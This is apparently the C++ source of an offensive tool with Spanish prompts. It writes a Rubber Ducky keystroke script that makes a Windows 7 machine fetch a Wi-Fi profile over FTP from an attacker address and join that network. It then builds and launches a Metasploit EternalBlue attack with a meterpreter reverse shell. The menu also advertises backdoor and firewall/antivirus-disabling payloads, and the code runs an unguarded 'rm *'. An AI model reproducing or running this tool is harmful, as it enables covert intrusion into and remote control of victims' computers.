#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <cstring>
#include <fstream>
#include <sched.h>
#include <string>
#include "../include/hexConv.hpp"

using namespace std;

int create=1;

void generateXML(string SSID,string PASSWORD);
void msgError();
string hexName(string SSID);
int menu();
void caseTwo(string ip);
void generateRC(string LHOST, string RHOST);
void ftpServer();
void genHIDeternal(string SSID);
void metasploitHandler();


string altern;
string name_file;
int main(int argc, char *argv[]){
    string arguments[7];
    bool manker=true;
    int opc;
    string altern;
    for(int i=1;i<argc;i++){
        arguments[i]=string(argv[i]);
    }
    string LHOST=arguments[2];
    string LPORT=arguments[4];
    string name=arguments[6]+".exe";

    if (argc<2) {
        msgError();
    }
    if (strcmp(argv[1], "--LHOST")==0){
        if((arguments[2].length()==0) || (arguments[1].length()==0)){
            cout<<"[1]. Hace falta la Ip"<<endl;
            return 1;
        }
        else {
            if (strcmp(argv[3], "--LPORT")==0) {
                if ((arguments[4].length()==0) || (arguments[3].length()==0)) {
                    cout<<"[1]. Hace falta el Puerto"<<endl;
                    return 1;
                }
                else {
                    if (strcmp(argv[5], "--output")==0) {
                        if ((arguments[6].length()==0) || (arguments[5].length()==0)) {
                            cout<<"[1]. Hace falta el Nombre"<<endl;
                            return 1;
                        }
                        else {
                            do {
                                opc=menu();
                            }while (opc>4);
                            switch (opc) {
                                case 1:
                                    break;
                                case 2:
                                    // Generar xml exportable - eternalblue

                                    caseTwo(LHOST);
                                    ftpServer();



                                    metasploitHandler();
                                    cout<<" [1.] Disfrute del dia 0"<<endl;
                                    break;
                                case 3:
                                    break;
                                default:
                                    cout<<" [1]. Error al procesar seleccion...."<<endl;
                                    exit(1);
                            }
                        } 
                    }
                    else {
                        msgError();
                    }
                }
            }
            else {
                msgError();
            }
        }
    }
    else if (strcmp(argv[1], "--help")==0){
        cout<<endl;
        cout<<"•───────────────────────────────────────────────•"<<endl;
        cout<<" ejemplo:"<<endl;
        cout<<endl;
        cout<<"         ./main.o -ip <ip> -p <port> -o <name>"<<endl;
        cout<<"•───────────────────────────────────────────────•"<<endl;
    }
    else {
        msgError();
    }

    return 0;

}
void msgError(){
    cout<<endl;
    cout<<"•───────────────────────────────────────────────•"<<endl;
    cout<<" [!] Error a la hora de enviar los argumentos"<<endl;
    cout<<" ejemplo:"<<endl;
    cout<<endl;
    cout<<"         ./main.o --help"<<endl;
    cout<<"•───────────────────────────────────────────────•"<<endl;
    return;

}
void generateXML(string SSID, string PASSWORD){
    altern=SSID;
    string complet;
    for (int i=0; i<altern.size(); i++) {
        altern[i]=toupper(altern[i]);
    }
    name_file="XML-CONFIG-"+altern+".XML";
    altern="../lib/"+name_file;
    ofstream xml;
    xml.open(altern, ios::out);
    if (xml.fail()) {
        cout<<" [1]. No tienes permisos en este directorio..."<<endl;
        exit(1);
    }
    // Generando RED para importar
    xml<<"<?xml version=\"1.0\"?>"<<endl;
    xml<<"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"<<endl;
    xml<<"\t<name>"<<SSID<<"</name>"<<endl;
    xml<<"\t<SSIDConfig>"<<endl;
    xml<<"\t\t<SSID>"<<endl;
    xml<<"\t\t\t<hex>"<<hexName(SSID)<<"</hex>"<<endl;
    xml<<"\t\t\t<name>"<<SSID<<"</name>"<<endl;
    xml<<"\t\t</SSID>"<<endl;
    xml<<"\t</SSIDConfig>"<<endl;
    xml<<"\t<connectionType>ESS</connectionType>"<<endl;
    xml<<"\t<connectionMode>auto</connectionMode>"<<endl;
    xml<<"\t<MSM>"<<endl;
    xml<<"\t\t<security>"<<endl;
    xml<<"\t\t\t<authEncryption>"<<endl;
    xml<<"\t\t\t\t<authentication>WPA2PSK</authentication>"<<endl;
    xml<<"\t\t\t\t<encryption>AES</encryption>"<<endl;
    xml<<"\t\t\t\t<useOneX>false</useOneX>"<<endl;
    xml<<"\t\t\t</authEncryption>"<<endl;
    xml<<"\t\t\t<sharedKey>"<<endl;
    xml<<"\t\t\t\t<keyType>passPhrase</keyType>"<<endl;
    xml<<"\t\t\t\t<protected>false</protected>"<<endl;
    xml<<"\t\t\t\t<keyMaterial>"<<PASSWORD<<"</keyMaterial>"<<endl;
    xml<<"\t\t\t</sharedKey>"<<endl;
    xml<<"\t\t</security>"<<endl;
    xml<<"\t</MSM>"<<endl;
    xml<<"</WLANProfile>"<<endl;
    xml.close();

}
void generateRC(string RHOST, string LHOST){
    ofstream rc;
    rc.open("../lib/eternal.rc", ios::out);
    rc<<"use exploit/windows/smb/ms17_010_eternalblue"<<endl;
    rc<<"set RHOST "<<RHOST<<endl;
    rc<<"set PAYLOAD windows/x64/meterpreter/reverse_tcp"<<endl;
    rc<<"set LHOST "<<LHOST<<endl;
    rc<<"exploit"<<endl;
}
string hexName(string SSID){

    string hexSSID=SSID;
    convertir(hexSSID,hexSSID);

    for (int i=0; i<hexSSID.size(); i++) {
        hexSSID[i]=toupper(hexSSID[i]);
    }
    return hexSSID;
}
int menu(){
    int seleccion;
    cout<<" [!] Que tipo de PAYLOAD HID decea generar (windows 7)"<<endl;
    cout<<"                                                 •────────────────────────────────────────────────────────────────•"<<endl;
    cout<<"                                                 | [1] HID - Descargar WGET y Generar puerta trasera              |"<<endl;
    cout<<"                                                 | [2] HID - Descargar y Exportar HOSTPOT - exploit eternalblue   |"<<endl;
    cout<<"                                                 | [3] HID - Desabilitar Firewall - Antiviruz                     |"<<endl;
    cout<<"                                                 •────────────────────────────────────────────────────────────────•"<<endl;
    cout<<endl;
    cout<<" [+] Digite su exploit : ";cin>>seleccion;

    return seleccion;
}

void caseTwo(string ip){
    string SSID;
    string PASSWORD;
    string RHOST;
    cin.ignore();
    cout<<" [!] Digite el SSID de la red       : "; 
    getline(cin,SSID);
    cout<<" [!] Digite la contraseña de la red : ";
    getline(cin, PASSWORD);
    cout<<" [!] Digite el RHOST o Objetivo      : ";
    getline(cin,RHOST);
    system("rm *");
    generateRC(RHOST,ip);
    generateXML(SSID, PASSWORD);
    genHIDeternal(SSID);

}
void ftpServer(){
    system("python3 ../ftpserver/ftpserver.py  > /dev/null 2>&1 &");
}
void genHIDeternal(string SSID){
    ofstream hid;
    hid.open("../lib/SourceDucky/exploit-eternal.sh", ios::out);
    if (hid.fail()) {
        cout<<" [1]. Error usted no tiene permisos en este directorio..."<<endl;
        exit(1);
    }
    hid<<"DELAY 5000"<<endl;
    hid<<"WINDOWS r"<<endl;
    hid<<"DELETE"<<endl;
    hid<<"STRING cmd.exe"<<endl;
    hid<<"ENTER"<<endl;
    hid<<"DELAY 100"<<endl;
    hid<<"STRING echo open 192.168.43.1 2121 >> ftp &echo user root root123 >> ftp &echo binary >> ftp &echo get "<<name_file<<" >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp"<<endl;
    hid<<"ENTER"<<endl;
    hid<<"DELAY 1000"<<endl;
    hid<<"STRING netsh wlan add profile filename=\""<<name_file<<"\""<<endl;
    hid<<"ENTER"<<endl;
    hid<<"DELAY 100"<<endl;
    hid<<"netsh wlan connect name="<<SSID<<endl;
    hid<<"ENTER"<<endl;
    hid<<"STRING exit"<<endl;
    hid<<"ENTER"<<endl;
}
void metasploitHandler(){
    system("xterm -class Foo -name foo -u8 -fa 'Terminus' -132 -T Imprimiendo -geometry 41x37+0+0 -e msfconsole -qr ../lib/eternal.rc &");
}
